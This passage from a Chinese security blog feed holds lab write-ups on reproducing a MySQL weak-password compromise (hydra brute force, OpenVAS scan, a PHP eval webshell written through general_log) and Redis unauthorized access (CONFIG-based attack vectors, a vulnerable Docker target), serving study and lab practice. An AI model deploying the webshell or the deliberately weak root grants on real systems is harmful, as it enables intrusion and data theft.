class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">apt-get -y install openvas</span><br><span class="line"></span><br><span class="line"># 启动流程，涉及证书导入，数据库启动，openvas进程启动等，有些费时</span><br><span class="line">openvas setup</span><br><span class="line"></span><br><span class="line"># 检擦安装版本8或者版本9的开启情况，现在的最新版本是版本9，这个脚本比较方便我们去判断到底openvas是否启动完成，如果有报错，我们可以根据日志文件和fix建议进行相关操作。</span><br><span class="line">openvas-check-setup [-v8]|[-v9] </span><br><span class="line">/*</span><br><span class="line">使用openvas-stop或openvas-start命令，将同时停止或启动OpenVAS服务中的三个程序，即Greenbone Security Assistant、OpenVAS Scanner和OpenVAS Manager。如果用户想要启动或停止单个服务时，可以使用service命令实现。</span><br><span class="line"></span><br><span class="line">9390为openvas 管理端端口</span><br><span class="line">9391 scanner扫描端口</span><br><span class="line">9392 web界面登录端口</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"># 获取/创建用户，并修改用户密码</span><br><span class="line">openvasmd --get-users</span><br><span class="line">sudo openvasmd --create-user=admin --role=Admin</span><br><span class="line">openvasmd --user=admin --new-password=123</span><br><span class="line"></span><br><span class="line"># openvas 版本升级</span><br><span class="line">openvas-feed-update</span><br></pre></td></tr></table></figure><h3 id="fedora"><a href="#fedora" class="headerlink" title="fedora"></a>fedora</h3><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#关闭selinux</span><br><span class="line">vim /etc/selinux/config </span><br><span class="line">#将SELINUX=enforcing改为SELINUX=disabled,重启机器即可</span><br><span class="line"></span><br><span class="line"># 更新</span><br><span class="line">sudo dnf update</span><br><span class="line"></span><br><span class="line">#安装openvas</span><br><span class="line">sudo dnf install openvas*</span><br><span class="line"></span><br><span class="line">#安装redis</span><br><span class="line">sudo dnf install redis* -y</span><br><span class="line"></span><br><span class="line">#安装sqlite3</span><br><span class="line">sudo dnf install sqlite3* -y</span><br><span class="line"></span><br><span class="line">#安装证书生成工具</span><br><span class="line">sudo dnf guntls-utils</span><br><span class="line"></span><br><span class="line">#编辑redis配置文件，删除以下前导符‘#’</span><br><span class="line"># unixsocket /tmp/redis.sock</span><br><span class="line"># unixsocketperm 700</span><br><span class="line"></span><br><span class="line">#后台启动redis</span><br><span class="line">sudo redis-server /etc/redis.conf&amp;</span><br><span class="line"></span><br><span class="line">#检擦启动情况</span><br><span class="line">openvas-check-setup [-v8]|[-v9] </span><br><span class="line"></span><br><span class="line">#同步nvt库</span><br><span class="line">sudo greenbone-nvt-sync</span><br><span class="line"></span><br><span class="line">#建立同步本地scapdata数据库</span><br><span class="line">sudo greenbone-scapdate-sync</span><br><span class="line"></span><br><span class="line">#获取证书</span><br><span class="line">sudo greenbone-certdata-sync</span><br><span class="line"></span><br><span class="line">#递归创建需要的目录</span><br><span class="line">sudo mkdir -p /var/lib/openvas/openvasmd/gnupg</span><br><span class="line"></span><br><span class="line">#启动scanner</span><br><span class="line">sudo openvassd</span><br><span class="line"></span><br><span class="line">#重建数据库,耗时较久</span><br><span class="line">sudo openvasmd --rebuild</span><br><span class="line"></span><br><span class="line">#创建用户和修改密码</span><br><span class="line">sudo openvasmd --create-user=admin --role=Admin</span><br><span class="line">openvasmd --user=admin --new-password=password</span><br><span class="line"></span><br><span class="line">#生成证书</span><br><span class="line">sudo openvas-manage-cert -a</span><br><span class="line"></span><br><span class="line">#启动gsad(greenbone security assistant),设置端口信息</span><br><span class="line">sudo gsad --listen=127.0.0.1 --port=9392 </span><br><span class="line"></span><br><span class="line">#启动openvasd</span><br><span class="line">sudo openvasd</span><br></pre></td></tr></table></figure><h6 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo redis-server /etc/redis.conf &amp;</span><br><span class="line">sudo openvassd</span><br><span class="line">sudo openvasmd</span><br><span class="line">sudo gsad --listen=127.0.0.1 --port=9392</span><br></pre></td></tr></table></figure><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 搜索镜像</span><br><span class="line">docker search openvas</span><br><span class="line">#选择排名最高的</span><br><span class="line">docker pull mikesplain/openvas:9</span><br><span class="line">#限制cpu和内存，以deamon方式启动镜像</span><br><span class="line">docker run --cpuset-cpus=2 -m 2048M -d -p 443:443 --name openvas mikesplain/openvas:9</span><br><span class="line">#浏览器访问：https://localhost,登陆用户名/密码为：admin/admin，enjoy!</span><br></pre></td></tr></table></figure><h1 id="mysql弱密码环境配置"><a href="#mysql弱密码环境配置" class="headerlink" title="mysql弱密码环境配置"></a>mysql弱密码环境配置</h1><p>搭建好<code>lamp</code>后开始进行修改配置</p><h3 id="mysql设置远程访问"><a href="#mysql设置远程访问" class="headerlink" title="mysql设置远程访问"></a>mysql设置远程访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 修改配置文件和设置远程访问运行，以root用户为例</span><br><span class="line"></span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION;# 把所有权限赋予root用户,并让root用户拥有分配这些权限的权利，同时设置登陆密码为123456，同时接受任何远程主机的连接</span><br><span class="line">FLUSH PRIVILEGES  #刷新权限表</span><br><span class="line"></span><br><span class="line">体外话：</span><br><span class="line"># 假设要给lypto用户在192.168.1.100的内网机器访问的权限，则</span><br><span class="line">//GRANT ALL PRIVILEGES ON *.* TO &apos;lypto&apos;@’192.168.1.100’ IDENTIFIED BY &apos;654321&apos; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure><h3 id="iptables-端口放行"><a href="#iptables-端口放行" class="headerlink" title="iptables 端口放行"></a>iptables 端口放行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 3306 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -P tcp --sport 3306 -j ACCEPT</span><br></pre></td></tr></table></figure><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>为了减少爆破难度和速度，mysql远程登陆的密码设置为123456，并且自制字典仅包含两项wearefamily,123456,尝试爆破</p><p><img src="/myimages/mysql弱密码登陆/hydra.png" alt="image"></p><h3 id="OpenVAS扫描"><a href="#OpenVAS扫描" class="headerlink" title="OpenVAS扫描"></a>OpenVAS扫描</h3><p><img src="/myimages/mysql弱密码登陆/scan.png" alt="image"></p><p><img src="/myimages/mysql弱密码登陆/result.png" alt="image"></p><p><img src="/myimages/mysql弱密码登陆/passwd.png" alt="image"></p><p>使用openvas进行扫描，设置参数的时候为了减少扫描时间，可以设置只扫描3306端口，尽管这样，因为是虚拟机里面运行，所以比较慢，最后结果比较理想，不仅仅返回了mysql弱密码的9.0以上的高危漏洞评级，而且在漏洞细节里面还爆破出了密码：123456</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h3 id="登陆mysql后参数查看与信息搜集"><a href="#登陆mysql后参数查看与信息搜集" class="headerlink" title="登陆mysql后参数查看与信息搜集"></a>登陆mysql后参数查看与信息搜集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">select version();</span><br><span class="line">select @@version;</span><br><span class="line">select current_user();</span><br><span class="line">select user();</span><br><span class="line">select database();</span><br><span class="line">select @@version_compile_os;</span><br><span class="line">select @@basedir;</span><br><span class="line"># 默认值 5.7.20-0ubuntu0.16.04.1 /usr/ </span><br><span class="line">select @@datadir;</span><br><span class="line"># 默认值 5.7.20-0ubuntu0.16.04.1 /var/lib/mysql/</span><br><span class="line">select @@plugin_dir; </span><br><span class="line"># 默认值 5.7.20-0ubuntu0.16.04.1 /usr/lib/mysql/plugin/</span><br><span class="line">select @@secure_file_priv</span><br><span class="line"># 默认值 5.7.20-0ubuntu0.16.04.1 /var/lib/mysql-files/</span><br><span class="line">SHOW VARIABLES LIKE  &quot;secure_file_priv&quot;;</span><br><span class="line">SELECT @@global.secure_file_priv;</span><br><span class="line">show variables like &apos;%general%&apos;;</span><br></pre></td></tr></table></figure><h3 id="mysql文件操作传shell"><a href="#mysql文件操作传shell" class="headerlink" title="mysql文件操作传shell"></a>mysql文件操作传shell</h3><p><code>secure_file_priv</code> mysql的一个全局只读变量,即使是root用户也没有办法对其进行运行时修改。用于限制数据的导入导出，例如<code>load_file</code> 和<code>select … into outfile</code> 等。<br><code>mysql 5.5.53</code> 和以前的版本，默认值为空。允许导入导出。之后的版本默认为‘NULL’ ,禁用了导入导出功能。为了安全，不要设置为空。可以设置为NULL 或者 一个限制好权限的目录。</p><h3 id="靶机开放读写的权限，设置secure-file-prive-var-www-html"><a href="#靶机开放读写的权限，设置secure-file-prive-var-www-html" class="headerlink" title="靶机开放读写的权限，设置secure_file_prive=/var/www/html"></a>靶机开放读写的权限，设置<code>secure_file_prive=/var/www/html</code></h3><p>但是现在mysql以及相对安全了许多，默认的值是，并且不允许在运行时修改，这样在利用的时候就显得有些鸡肋。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 限制mysqld的导入和导出，完全禁止出。</span><br><span class="line">mysqld --secure_file_prive=null</span><br><span class="line"># 限制mysqld的导入和导出，只能在特定目录 /tmp/之下</span><br><span class="line">mysqld --secure_file_priv=/tmp/</span><br><span class="line"># 不限制mysqld的导入和导出</span><br><span class="line">在文件/etc/my.cnf中不写 --secure_file_priv</span><br></pre></td></tr></table></figure></p><h3 id="使用mysql日志功能写shell"><a href="#使用mysql日志功能写shell" class="headerlink" title="使用mysql日志功能写shell"></a>使用mysql日志功能写shell</h3><p>在网上看到可以开启日志记录功能，直接修改log的写入文件，就可以传入webshell,网上的教程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = on;  # 开启general log模式</span><br><span class="line">set global general_log_file = &apos;/var/www/html/1.php&apos;;   # 设置日志目录为shell地址</span><br><span class="line">select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos;  # 写入shell</span><br></pre></td></tr></table></figure></p><p>但是在具体的实现过程中，发现这个利用也有相当多的限制条件，首先<code>/var/www/html/</code>下必须要有写的权限，其次写入的shell还要能够以apache2运行用户如<code>www-data</code>执行得起来。实操中发现，手动修改了<code>/var/www/html</code> 权限为<code>777</code>的条件下，在linux的环境下菜刀仍旧是连不上。当修改mysql log写入文件如shell.php的权限为<code>777</code>的时候，才可以连得上。但是令人最为费解的地方在于，以root用户身份重新修改了文件权限为原来的620，发现菜刀仍旧可以连得上，难不成这一次修改来回发生了什么不为人知的奥秘？笔者一时解释不清，暂时放在这。慢慢探讨究竟。 </p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.freebuf.com/column/152404.html" target="_blank" rel="noopener">http://www.freebuf.com/column/152404.html</a><br><a href="https://www.cnblogs.com/zhaijiahui/p/8371336.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/8371336.html</a><br><a href="https://www.jianshu.com/p/a4f01fc3a720" target="_blank" rel="noopener">https://www.jianshu.com/p/a4f01fc3a720</a><br><a href="https://blog.csdn.net/qq_15983061/article/details/77892851" target="_blank" rel="noopener">https://blog.csdn.net/qq_15983061/article/details/77892851</a><br><a href="http://blkstone.github.io/2017/12/31/mysql-sqli-to-webshell/" target="_blank" rel="noopener">http://blkstone.github.io/2017/12/31/mysql-sqli-to-webshell/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql弱密码 </tag>
            
            <tag> hydra </tag>
            
            <tag> OpenVAS </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>redis未授权访问</title>
      <link href="/2018/08/12/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
      <url>/2018/08/12/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/redis未授权/redis1.png" height="350" width="350"></p><blockquote><p>漏洞虽然是比较老，但是本着积累经验的思想，同时学习在docker环境下实现漏洞环境复现，折腾了些点时间，现把相关总结记录如下。dockerfile 已经上传在了github：<a href="https://github.com/IversionBY/vulntarget" target="_blank" rel="noopener">https://github.com/IversionBY/vulntarget</a><br><a id="more"></a></p></blockquote><h1 id="漏洞知识背景"><a href="#漏洞知识背景" class="headerlink" title="漏洞知识背景"></a>漏洞知识背景</h1><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。通俗的来说就是redis默认配置文件端口访问是不需要认证的。这样一来，根据redis服务运行权限，我们可以以其为门窗实现渗透利用，包括但不仅限于传webshell，root权限下的<code>authorized_keys</code>公钥注入，实现ssh免密登陆，回弹shell等一系列操纵。</p><h1 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h1><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>数据类型：string(字符串),hash(散列),list(列表),set(集合),zset(有序集合)。每种数据类型都内置了很多方便操作的函数来实现对数据的处理。更多的可以参考:<a href="http://www.runoob.com/redis/redis-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/redis/redis-tutorial.html</a></p><ol><li><p>string 是 redis 最基本的类型，一个 key 对应一个 value。string也可以为二进制，图片等等类型。string 类型的值最大能存储 512MB</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; SET name &quot;1ypto&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; GET name</span><br><span class="line">&quot;1ypto&quot;</span><br></pre></td></tr></table></figure></li><li><p>哈希是一个key值里面有field和value的映射表，可以看成是有名字的字典。比较适合存储对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; HMSET myhash field1 &quot;Hello&quot; field2 &quot;World&quot;</span><br><span class="line">&quot;OK&quot;</span><br><span class="line">127.0.0.1:6379&gt; HGET myhash field1</span><br><span class="line">&quot;Hello&quot;</span><br><span class="line">127.0.0.1:6379&gt; HGET myhash field2</span><br><span class="line">&quot;World&quot;</span><br></pre></td></tr></table></figure></li><li><p>Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）。列表和python有点类似，但是插入方式更为灵活，可以前（左），可以后（右）。列表最多可存储 232 - 1 元素 (4294967295, 每个列表可存储40多亿)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; LPUSH 1ypto redis</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; LPUSH 1ypto hello</span><br><span class="line">(integer) 2</span><br><span class="line">127.0.0.1:6379&gt; LPUSH 1ypto hello</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; RPUSH 1ypto world</span><br><span class="line">(integer) 4</span><br><span class="line">127.0.0.1:6379&gt; LRANGE 1ypto 0 3</span><br><span class="line">1) &quot;hello&quot;</span><br><span class="line">2) &quot;hello&quot;</span><br><span class="line">3) &quot;redis&quot;</span><br><span class="line">4) &quot;world&quot;</span><br></pre></td></tr></table></figure></li><li><p>Redis 的 Set 是 String 类型的无序集合。集合成员是唯一的，这就意味着集合中不能出现重复的数据。不允许重复是和列表最大的差别。集合中最大的成员数为 232 - 1(4294967295, 每个集合可存储40多亿个成员)。</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sadd redis redis</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; sadd redis hello</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; sadd redis hello</span><br><span class="line">(integer) 0</span><br><span class="line">127.0.0.1:6379&gt; sadd redis world</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; smember redis</span><br><span class="line">1) &quot;hello&quot;</span><br><span class="line">2) &quot;world&quot;</span><br><span class="line">3) &quot;redis&quot;</span><br></pre></td></tr></table></figure><ol><li>Redis zset 和 set 一样也是string类型元素的集合,且不允许重复的成员。<br>不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。zset的成员是唯一的,但分数(score)却可以重复。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; zadd hacker 1 redis</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd hacker 5 hello</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd hacker 4 hello</span><br><span class="line">(integer) 0</span><br><span class="line">127.0.0.1:6379&gt; zadd hacker 3 world</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; ZRANGEBYSCORE hacker 0 5</span><br><span class="line">1) &quot;redis&quot;</span><br><span class="line">2) &quot;world&quot;</span><br><span class="line">3) &quot;hello&quot;</span><br></pre></td></tr></table></figure></li></ol><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hellogirl@Lypto:~$ wget wget http://download.redis.io/releases/redis-4.0.11.tar.gz</span><br><span class="line">hellogirl@Lypto:~$ tar zxf redis-4.0.11.tar.gz</span><br><span class="line">hellogirl@Lypto:~$ cd redis-4.0.11/</span><br><span class="line">hellogirl@Lypto:~/redis-4.0.11$ ls</span><br><span class="line">00-RELEASENOTES  CONTRIBUTING  deps     Makefile   README.md   runtest          runtest-sentinel  src    utils</span><br><span class="line">BUGS             COPYING       INSTALL  MANIFESTO  redis.conf  runtest-cluster  sentinel.conf     tests</span><br><span class="line">hellogirl@Lypto:~/redis-4.0.11$ make</span><br></pre></td></tr></table></figure><p>注意到安装完后<code>redis-server</code>,<code>redis-cli</code>在src文件夹里面，<code>redis.conf</code>配置文件在根目录下</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//登陆</span><br><span class="line">redis-cli -h host -p port -a password（if has） --raw(避免中文乱码)</span><br><span class="line"></span><br><span class="line">//系统</span><br><span class="line"></span><br><span class="line">QUIT   //关闭连接</span><br><span class="line">HELP [CMD]  //查看cmd帮助</span><br><span class="line">CLUSTER SLOTS  //获取集群节点的映射数组</span><br><span class="line">COMMAND        //获取 Redis 命令详情数组</span><br><span class="line">DBSIZE        //返回当前数据库的 key 的数量</span><br><span class="line">KEYS *        //列出所有key值</span><br><span class="line">KEYS [patten]//正则搜索键值</span><br><span class="line">INFO         //获取redis服务器的各种信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//删除</span><br><span class="line"></span><br><span class="line">FLUSHDB   // 清除当前数据库的所有keys</span><br><span class="line">FLUSHALL     // 清除所有数据库的所有keys</span><br><span class="line"></span><br><span class="line">//攻击常用的向量</span><br><span class="line"></span><br><span class="line">CONFIG GET dir  //获取默认的redis目录</span><br><span class="line">CONFIG SET dir [xxx]  //修改redis目录</span><br><span class="line">CONFIG GET dbfilename  //获取rdb文件名</span><br><span class="line">CONFIG GET dbfilename [xxx]  //修改rdb文件名</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>更多命令可查阅官方文档：<a href="https://redis.io/commands" target="_blank" rel="noopener">https://redis.io/commands</a></p><h1 id="漏洞的利用方式"><a href="#漏洞的利用方式" class="headerlink" title="漏洞的利用方式"></a>漏洞的利用方式</h1><p>我们可以根据漏洞的原理，从远程免认证登陆redis,然后利用内置命令如<code>CONFIG</code>等来做文章（上文提到的攻击向量）。常见的有这种利用方式，读取key值数据，进行信息搜集和泄露，删库改库以及回弹shell,写入webshell,ssh免密密登陆等一系列操作。前人的文章比较多，总结得也十分到位，这里给出一些链接。<br><a href="http://www.alloyteam.com/2017/07/12910/" target="_blank" rel="noopener">AlloyTeam：Redis 未授权访问漏洞利用总结</a><br><a href="http://p0sec.net/index.php/archives/69/" target="_blank" rel="noopener">p0’s blog：redis 未授权访问漏洞利用总结</a><br><a href="http://www.freebuf.com/vuls/148758.html" target="_blank" rel="noopener">不请自来 | Redis 未授权访问漏洞深度利用</a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>对于漏洞复现的部分，笔者使用的是docker容器进行部署。之前对docker的使用不算熟练，这次也算是加深了自己对docker的操作。这个漏洞复现是使用redis未授权访问进行ssh免密登陆。构建的容器中已经安装部署了redis-server和openssh-server,也写了自动化运行服务脚本，需要做的就是漏洞验证部分，具体可以参照上面的利用方式相关文章。</p><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line"></span><br><span class="line">MAINTAINER mini.lypto@gmail.com</span><br><span class="line"></span><br><span class="line">WORKDIR /root</span><br><span class="line"></span><br><span class="line">RUN apt-get update\</span><br><span class="line">        &amp;&amp;apt-get  install -y openssh-server\</span><br><span class="line">        &amp;&amp;apt-get -y  install gcc\</span><br><span class="line">        &amp;&amp;apt-get -y  install make\</span><br><span class="line">        &amp;&amp;wget http://download.redis.io/releases/redis-3.2.0.tar.gz\</span><br><span class="line">        &amp;&amp;tar -xzf redis-3.2.0.tar.gz\</span><br><span class="line">        &amp;&amp;cd redis-3.2.0\</span><br><span class="line">        &amp;&amp;make</span><br><span class="line">COPY ./redis.conf /root/redis-3.2.0</span><br><span class="line">COPY ./script.sh /root </span><br><span class="line">CMD ./root/script.sh</span><br></pre></td></tr></table></figure><ul><li>为了构建镜像，需要运用到虚拟机和主机的文件copy。先把修改好的redis.conf从镜像里面copy到主机，然后才可以在Dockerfile中使用COPY。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//先拿到容器的短ID或者指定的name</span><br><span class="line">docker ps -all</span><br><span class="line">//通过容器[短id]拿到ID全称</span><br><span class="line">docker inspect -f &apos;&#123;&#123;.Id&#125;&#125;&apos; [短id]</span><br><span class="line"></span><br><span class="line">//拿到全ID就可以进行相互copy了</span><br><span class="line">docker cp 本地文件路径 ID全称:容器路径</span><br><span class="line">docker cp ID全称:容器文件路径 本地路径</span><br></pre></td></tr></table></figure><ul><li>在从dockerfile构建镜像，部署容器的时候，记得做好端口映射，否则无法从外部访问redis以及ssh服务。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//通过Dockerfile构建镜像</span><br><span class="line">docker build -t  ./   redisvuln:1.0</span><br><span class="line"></span><br><span class="line">//运行镜像并进行端口绑定，确保主机端口22,6379不被占用，或者修改为其他端口</span><br><span class="line">docker run -ti -p 22:22 -p 6379:6379 redisvuln</span><br><span class="line">//或者使用后台运行方式,然后使用docker logs查看输出</span><br><span class="line">docker run -d redisvuln</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> linux </tag>
            
            <tag> redis </tag>
            
            <tag> 未授权访问 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bypass_SQL</title>
      <link href="/2018/08/08/Bypass-SQL/"/>
      <url>/2018/08/08/Bypass-SQL/</url>
      
